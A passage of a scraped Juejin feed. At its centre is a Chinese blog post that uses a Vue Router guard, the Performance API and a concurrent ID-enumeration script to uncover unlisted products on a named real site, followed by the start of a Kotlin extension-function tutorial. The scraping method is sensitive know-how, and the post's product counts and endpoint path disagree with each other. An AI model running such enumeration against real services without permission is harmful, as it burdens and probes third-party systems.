<p>用引用表达<strong>契约</strong>（必须存在），用指针表达<strong>可选性</strong>（可能为空）。</p>
</blockquote></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[前端侦探：我是如何挖掘出网站里 28 个"隐藏商品"的？]]></title>    <link>https://juejin.cn/post/7605816833191641088</link>    <guid>https://juejin.cn/post/7605816833191641088</guid>    <pubDate>2026-02-13T03:36:08.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605816833191641088" data-draft-id="7605772919224778786" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="前端侦探：我是如何挖掘出网站里 28 个&quot;隐藏商品&quot;的？"/> <meta itemprop="keywords" content="前端,Vue.js"/> <meta itemprop="datePublished" content="2026-02-13T03:36:08.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="小冰球"/> <meta itemprop="url" content="https://juejin.cn/user/2014722836669176"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            前端侦探：我是如何挖掘出网站里 28 个"隐藏商品"的？
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2014722836669176/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    小冰球
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T03:36:08.000Z" title="Fri Feb 13 2026 03:36:08 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">前端侦探：我是如何挖掘出网站里 28 个"隐藏商品"的？</h2>
<blockquote>
<p><strong>免责声明</strong>：本文仅供技术交流与学习，请勿利用文中技术手段对他人的服务器造成压力或进行恶意爬取。所有测试数据均来自公开接口。</p>
</blockquote>
<h3 data-id="heading-1">🕵️‍♂️ 从一个好奇心开始</h3>
<p>前几天逛一个数字产品合租平台（nf.video）时，我发现它首页只孤零零地挂着 6 个商品：Netflix、Disney+、Spotify 等常见的全家桶。</p>
<p>作为一个前端开发者，我的直觉告诉我：<strong>事情没这么简单</strong>。</p>
<p>通常这类平台为了 SEO 或者后台管理的统一性，数据库里往往躺着更多商品，只是因为库存、策略原因被前端"隐藏"了。今天就带大家通过<strong>浏览器控制台（Console）</strong>，用几招前端调试技巧，扒出那些藏在代码背后的秘密。</p>
<hr/>
<h3 data-id="heading-2">🔍 第一层：摆在明面上的数据</h3>
<p>首先，我们看看普通用户能看到什么。打开控制台，简单查一下 DOM：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 获取首页所有商品卡片</span>
<span class="hljs-keyword">const</span> cards = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelectorAll</span>(<span class="hljs-string">'.platFormItem'</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`首页可见商品数: <span class="hljs-subst">${cards.length}</span>`</span>);
<span class="hljs-comment">// 输出: 6</span>
</code></pre>
<p>确实只有 6 个。这建立了我们的"基准线"。如果后面我们找到了多于 6 个的数据，那就说明有"隐藏款"。</p>
<hr/>
<h3 data-id="heading-3">🎣 第二层：Vue Router 拦截术</h3>
<p>点击商品卡片会跳转到购买页。通常我们会看 Network 面板找链接，但这个网站是 SPA（单页应用），点击是路由跳转。</p>
<p>为了不真的跳走（跳走就得退回来，麻烦），我们可以利用 Vue Router 的<strong>全局前置守卫</strong>来做一个"钩子"。我们想知道点击卡片后，路由到底想带我们去哪？</p>
<p>我们可以直接在控制台注入这段代码：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 假设挂载在 app 上的 router 实例（视具体项目而定，通常在 vueApp.config 或 __vue_app__ 中）</span>
<span class="hljs-comment">// 这里演示思路</span>
<span class="hljs-keyword">const</span> router = <span class="hljs-variable language_">document</span>.<span class="hljs-title function_">querySelector</span>(<span class="hljs-string">'#app'</span>).<span class="hljs-property">__vue_app__</span>.<span class="hljs-property">config</span>.<span class="hljs-property">globalProperties</span>.<span class="hljs-property">$router</span>;

<span class="hljs-comment">// 👮‍♂️ 注册一个拦截守卫</span>
router.<span class="hljs-title function_">beforeEach</span>(<span class="hljs-function">(<span class="hljs-params">to, <span class="hljs-keyword">from</span>, next</span>) =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`🎯 捕获到目标路由: <span class="hljs-subst">${to.fullPath}</span>`</span>);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`📦 参数 ID: <span class="hljs-subst">${to.params.id}</span>`</span>);
    
    <span class="hljs-comment">// ✋ next(false) 阻止实际跳转，我们就停在当前页</span>
    <span class="hljs-title function_">next</span>(<span class="hljs-literal">false</span>); 
});
</code></pre>
<p>然后在页面上点击一个"苹果商店"的卡片：</p>
<blockquote>
<p>Console 输出:
<code>🎯 捕获到目标路由: /buy/31</code>
<code>📦 参数 ID: 31</code></p>
</blockquote>
<p>Bingo！我们摸清了路由规则：<code>/buy/:id</code>。这意味着商品是以 ID 为索引的。</p>
<hr/>
<h3 data-id="heading-4">🕵️ 第三层：Performance API 里的蛛丝马迹</h3>
<p>页面加载完了，Network 面板里的请求都被冲掉了或者很难找。这时，浏览器原生的 <strong>Performance API</strong> 就像一个黑匣子，记录了所有发生过的资源请求。</p>
<p>我想看看前端到底请求了哪些 API 接口：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 筛选所有 XMLHttpRequest 或 Fetch 请求</span>
<span class="hljs-keyword">const</span> apiRequests = performance.<span class="hljs-title function_">getEntriesByType</span>(<span class="hljs-string">'resource'</span>)
  .<span class="hljs-title function_">filter</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e.<span class="hljs-property">initiatorType</span> === <span class="hljs-string">'xmlhttprequest'</span> || e.<span class="hljs-property">initiatorType</span> === <span class="hljs-string">'fetch'</span>)
  .<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">e</span> =&gt;</span> e.<span class="hljs-property">name</span>);

<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">table</span>(apiRequests);
</code></pre>
<p>在一堆日志里，我发现了这几个有趣的接口：</p>
<ul>
<li><code>/api/applets/goods/get/homeManage</code> (首页数据，估计就那 6 个)</li>
<li><code>/api/applets/goods/get/categoryGoods</code> (分类商品？这个听起来有戏！)</li>
</ul>
<p>我尝试手动调用了一下这个 <code>categoryGoods</code> 接口：</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-title function_">fetch</span>(<span class="hljs-string">'/api/applets/goods/get/categoryGoods'</span>)
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
  .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">data</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`拿到所有商品数: <span class="hljs-subst">${data.data.length}</span>`</span>));
<span class="hljs-comment">// 输出: 27</span>
</code></pre>
<p><strong>27 个！</strong> 远超首页的 6 个。</p>
<p>通过分析返回的 JSON，我看到了大量首页没展示的商品：</p>
<ul>
<li><code>ID 20</code>: MagSafe 三合一无线充</li>
<li><code>ID 96</code>: 银河次时代智能 NAS (这啥黑科技？)</li>
<li><code>ID 111</code>: Typora 正版授权</li>
</ul>
<p>到这里，如果是普通用户可能就满足了。但作为程序员，我注意到 ID 并不连续。最大的 ID 是 113，但中间缺了很多数字。</p>
<p><strong>那些消失的 ID 去哪了？</strong></p>
<hr/>
<h3 data-id="heading-5">🚀 第四层：ID 暴力枚举与深度挖掘</h3>
<p>既然知道了 API 模式是 <code>/api/applets/goods/get/:id</code>，且 ID 是数字。那我能不能写个脚本，把 1 到 200 的 ID 全扫一遍？</p>
<p>这就像是在玩"扫雷"。</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// 简单的并发探测脚本</span>
<span class="hljs-keyword">async</span> <span class="hljs-keyword">function</span> <span class="hljs-title function_">scanHiddenGoods</span>(<span class="hljs-params">maxId</span>) {
    <span class="hljs-keyword">const</span> hiddenGoods = [];
    
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`🚀 开始扫描 ID 1 - <span class="hljs-subst">${maxId}</span>...`</span>);
    
    <span class="hljs-keyword">const</span> promises = [];
    <span class="hljs-keyword">for</span> (<span class="hljs-keyword">let</span> id = <span class="hljs-number">1</span>; id &lt;= maxId; id++) {
        <span class="hljs-keyword">const</span> p = <span class="hljs-title function_">fetch</span>(<span class="hljs-string">`/8081/api/applets/goods/get/<span class="hljs-subst">${id}</span>`</span>)
            .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> res.<span class="hljs-title function_">json</span>())
            .<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">res</span> =&gt;</span> {
                <span class="hljs-comment">// 如果接口返回成功且有数据</span>
                <span class="hljs-keyword">if</span> (res.<span class="hljs-property">code</span> === <span class="hljs-number">10000</span> &amp;&amp; res.<span class="hljs-property">data</span>) {
                    <span class="hljs-keyword">return</span> { id, <span class="hljs-attr">name</span>: res.<span class="hljs-property">data</span>.<span class="hljs-property">goodsName</span>, <span class="hljs-attr">price</span>: res.<span class="hljs-property">data</span>.<span class="hljs-property">price</span> };
                }
                <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;
            })
            .<span class="hljs-keyword">catch</span>(<span class="hljs-function">() =&gt;</span> <span class="hljs-literal">null</span>);
        promises.<span class="hljs-title function_">push</span>(p);
    }

    <span class="hljs-keyword">const</span> results = <span class="hljs-keyword">await</span> <span class="hljs-title class_">Promise</span>.<span class="hljs-title function_">all</span>(promises);
    <span class="hljs-keyword">return</span> results.<span class="hljs-title function_">filter</span>(<span class="hljs-title class_">Boolean</span>); <span class="hljs-comment">// 过滤掉 null</span>
}

<span class="hljs-comment">// 让我们跑一下</span>
<span class="hljs-title function_">scanHiddenGoods</span>(<span class="hljs-number">200</span>).<span class="hljs-title function_">then</span>(<span class="hljs-function"><span class="hljs-params">goods</span> =&gt;</span> {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">table</span>(goods);
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`🎉 共发现商品: <span class="hljs-subst">${goods.length}</span> 个`</span>);
});
</code></pre>
<p>几秒钟后，控制台打出了一张长长的表格。</p>
<p><strong>结果令人震惊：</strong></p>
<p>除了刚才分类列表里的 27 个，我又挖出了 <strong>8 个"幽灵商品"</strong>。这些商品连分类 API 都不返回，完全是"隐形"的，只有通过 ID 直达才能看到：</p>






























<table><thead><tr><th>ID</th><th>名称</th><th>这居然也有？</th></tr></thead><tbody><tr><td>18</td><td>GPT Plus</td><td>可能因为合规问题隐藏</td></tr><tr><td>26</td><td>Midjourney</td><td>只能直接访问购买</td></tr><tr><td>50</td><td>Runway</td><td>那个文生视频的 AI</td></tr><tr><td>105</td><td>Codex</td><td>编程神器</td></tr></tbody></table>
<p>这些商品很可能是测试下架的、或者是仅限内部/老客户通过链接购买的。</p>
<hr/>
<h3 data-id="heading-6">📝 总结</h3>
<p>通过这次探索，我们发现了网站里共有 <strong>34</strong> 个有效商品，而首页只展示了 <strong>17%</strong>。</p>
<p>回顾一下我们的"作案工具"：</p>
<ol>
<li><strong>DOM 解析</strong>：看清表象。</li>
<li><strong>Vue Router 守卫</strong>：拦截路由，探知路径规则。</li>
<li><strong>Performance API</strong>：回溯历史请求，定位关键后端接口。</li>
<li><strong>Promise.all 并发探测</strong>：暴力枚举，发现离散数据。</li>
</ol>
<p>前端开发不仅仅是画页面，善用浏览器提供的调试工具，我们可以对正在运行的应用有更深层的理解（或者单纯是为了满足好奇心 😉）。</p>
<hr/>
<p><em>如果你觉得这个分析过程有趣，欢迎点赞收藏！</em></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[让你的代码更整洁：10 个必知的 Kotlin 扩展函数]]></title>    <link>https://juejin.cn/post/7605941424535994422</link>    <guid>https://juejin.cn/post/7605941424535994422</guid>    <pubDate>2026-02-13T03:32:13.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7605941424535994422" data-draft-id="7605807405307396159" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="让你的代码更整洁：10 个必知的 Kotlin 扩展函数"/> <meta itemprop="keywords" content="Android"/> <meta itemprop="datePublished" content="2026-02-13T03:32:13.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="Ehtan_Zheng"/> <meta itemprop="url" content="https://juejin.cn/user/413072099642478"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            让你的代码更整洁：10 个必知的 Kotlin 扩展函数
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/413072099642478/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    Ehtan_Zheng
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-02-13T03:32:13.000Z" title="Fri Feb 13 2026 03:32:13 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-02-13
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读7分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>扩展函数是 Kotlin 最强大的特性之一，但许多开发者并未充分发挥其潜力。在审阅了数万行 Kotlin 代码后，我发现：恰到好处地使用扩展函数，能将冗长、重复的代码转化为优雅且易读的表达式。</p>
<p>别再写那些工具类（Helper classes）和静态方法（Utility methods）了。这十个扩展函数模式将让你的 Kotlin 代码更整洁、更具表现力，且更易于维护。</p>
<h3 data-id="heading-0">为什么扩展函数至关重要</h3>
<p>扩展函数允许你：</p>
<ul>
<li><strong>无需继承即可扩展功能</strong>：直接为现有类添加新功能。</li>
<li><strong>提升可读性</strong>：通过领域特定语言（DSL）使代码更易理解。</li>
<li><strong>减少样板代码</strong>：彻底消除臃肿的工具类（Utility classes）。</li>
<li><strong>实现自然链式操作</strong>：让代码调用逻辑更顺畅。</li>
</ul>
<p>让我们通过以下十个模式，看看它们是如何重塑你的代码库的。</p>
<h3 data-id="heading-1">模式 1：字符串校验扩展 (String Validation Extensions)</h3>
<p><strong>问题：</strong> 字符串校验逻辑散落在代码库的各个角落。</p>
<h4 data-id="heading-2">基础校验扩展</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// ✓ 简洁的校验扩展函数</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> String?.<span class="hljs-title">isValidEmail</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    <span class="hljs-keyword">return</span> matches(Regex(<span class="hljs-string">"^[A-Za-z0-9+_.-]+@[A-Za-z0-9.-]+\\.[A-Za-z]{2,}$"</span>))
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> String?.<span class="hljs-title">isValidPhone</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    <span class="hljs-keyword">return</span> matches(Regex(<span class="hljs-string">"^\\+?[1-9]\\d{1,14}$"</span>))
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> String?.<span class="hljs-title">isValidUrl</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">if</span> (<span class="hljs-keyword">this</span> == <span class="hljs-literal">null</span>) <span class="hljs-keyword">return</span> <span class="hljs-literal">false</span>
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">try</span> {
        java.net.URL(<span class="hljs-keyword">this</span>)
        <span class="hljs-literal">true</span>
    } <span class="hljs-keyword">catch</span> (e: Exception) {
        <span class="hljs-literal">false</span>
    }
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> String.<span class="hljs-title">isAlphanumeric</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> matches(Regex(<span class="hljs-string">"^[a-zA-Z0-9]+$"</span>))
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> String.<span class="hljs-title">containsDigit</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Boolean</span> {
    <span class="hljs-keyword">return</span> any { it.isDigit() }
}
</code></pre>
<h3 data-id="heading-3">高级字符串扩展</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-function"><span class="hljs-keyword">fun</span> String.<span class="hljs-title">truncate</span><span class="hljs-params">(maxLength: <span class="hljs-type">Int</span>, ellipsis: <span class="hljs-type">String</span> = <span class="hljs-string">"..."</span>)</span></span>: String {
    <span class="hljs-keyword">return</span> <span class="hljs-keyword">if</span> (length &lt;= maxLength) <span class="hljs-keyword">this</span>
    <span class="hljs-keyword">else</span> take(maxLength - ellipsis.length) + ellipsis
}

<span class="hljs-function"><span class="hljs-keyword">fun</span> String.<span class="hljs-title">capitalizeWords</span><span class="hljs-params">()</span></span>: String {
    <span class="hljs-keyword">return</span> split(<span class="hljs-string">" "</span>).joinToString(<span class="hljs-string">" "</span>) { word -&gt;
        word.replaceFirstChar { <span class="hljs-keyword">if</span> (it.isLowerCase()) it.titlecase() <span class="hljs-keyword">else</span> it.toString() }
    }
}

